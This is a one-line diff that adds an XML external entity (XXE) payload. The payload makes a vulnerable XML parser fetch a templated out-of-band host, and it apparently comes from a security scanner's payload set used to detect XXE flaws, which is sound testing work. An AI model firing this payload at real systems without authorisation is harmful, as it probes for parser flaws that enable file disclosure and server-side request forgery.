@@ -1,0 +1,1 @@
+<!DOCTYPE foo [ <!ENTITY % xxe PUBLIC "foo" "http://{{.oob}}"> %xxe; ]>
